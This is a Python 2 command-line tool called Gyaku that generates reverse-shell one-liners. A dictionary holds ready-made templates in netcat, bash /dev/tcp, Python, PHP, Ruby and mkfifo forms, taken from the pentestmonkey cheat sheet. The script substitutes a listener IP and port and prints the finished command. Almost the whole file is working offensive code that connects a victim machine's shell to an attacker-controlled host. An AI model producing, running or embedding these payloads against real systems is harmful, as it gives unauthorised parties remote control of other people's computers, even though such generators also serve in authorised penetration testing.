import argparse
import sys
import re


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
# Source : http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
reverse = {
		'nce':'nc -e /bin/sh [LH] [LP]',
		'bash':"bash -i >& /dev/tcp/[LH]/[LP] 0>&1",
		'py':"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""[LH]"",[LP]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'",
		'php': "php -r '$sock=fsockopen(""[LH]"",[LP]);exec(""/bin/sh -i <&3 >&3 2>&3"");'",
		'rb':"ruby -rsocket -e'f=TCPSocket.open(""[LH]"",[LP]).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",
		'nc':"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LH] [LP] >/tmp/f"
	}
def get_banner():
	print bcolors.OKGREEN + """  
   ____             _          
  / ___|_   _  __ _| | ___   _ 
 | |  _| | | |/ _` | |/ / | | |
 | |_| | |_| | (_| |   <| |_| |
  \____|\__, |\__,_|_|\_\\__,_|
        |___/""" + bcolors.ENDC + """Generator TCP Reverse Shell
		"""
	print bcolors.WARNING+"Version	:" +bcolors.ENDC + " v1.0"	
	print bcolors.WARNING+"Author 	: "+bcolors.ENDC + "Israel Araoz S."
	print bcolors.WARNING+"Twitter	: "+bcolors.ENDC + "@yaritu_"
	print bcolors.WARNING+"Github	: "+bcolors.ENDC + """https://github.com/iaraoz/gyaku
	"""
	
def main():
	get_banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-lh","--lhost",required=True,dest="ip",help="IP to get reverse shell" )
	parser.add_argument("-lp","--lport",required=True,dest="port",default=False,help="PORT to get reverse shell")
	parser.add_argument("-st","--style",required=True,dest="script",default=False,help="Select a script: py, pl, php, sh, nc, bash, rb")
	
	if len(sys.argv)==1:
		parser.print_help()
		sys.exit(1)
	args = parser.parse_args()
	if args.script in reverse:
		shell = reverse[args.script];shell = re.sub('\[LH\]',args.ip,shell);shell = re.sub('\[LP\]',args.port,shell)
		print bcolors.OKGREEN+"Reverse Shell : "+bcolors.ENDC,shell
			
	else:
		print bcolors.WARNING  +"[*] Script: [" +args.script + "] not implemented"+ bcolors.ENDC
if __name__=="__main__":main()
	